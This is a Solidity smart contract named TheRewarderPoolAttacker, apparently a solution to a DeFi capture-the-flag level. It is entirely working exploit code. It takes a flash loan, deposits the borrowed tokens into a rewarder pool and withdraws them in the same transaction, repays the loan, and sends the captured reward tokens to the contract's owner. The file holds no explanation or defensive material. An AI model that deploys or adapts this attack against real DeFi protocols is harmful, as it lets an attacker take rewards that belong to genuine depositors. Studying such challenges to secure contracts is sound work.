// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface interFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

interface interfaceTheRewarderPool {
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
}

contract TheRewarderPoolAttacker {

    IERC20 public immutable token;
    interfaceTheRewarderPool public immutable rewarderPool;
    interFlashLoanerPool public immutable flashLoanPool;
    IERC20 public immutable rewardToken;
    address immutable owner;

    constructor(address _token, address _rewardToken, address _flashLoanPool, address _rewarderPool) {
        token = IERC20(_token);
        rewarderPool = interfaceTheRewarderPool(_rewarderPool);
        flashLoanPool = interFlashLoanerPool(_flashLoanPool);
        rewardToken = IERC20(_rewardToken);
        owner = msg.sender;
    }

    function flashLoan(uint256 amount) external {
        flashLoanPool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        token.approve(address(rewarderPool),amount);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        token.transfer(msg.sender,amount);
        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
    }
}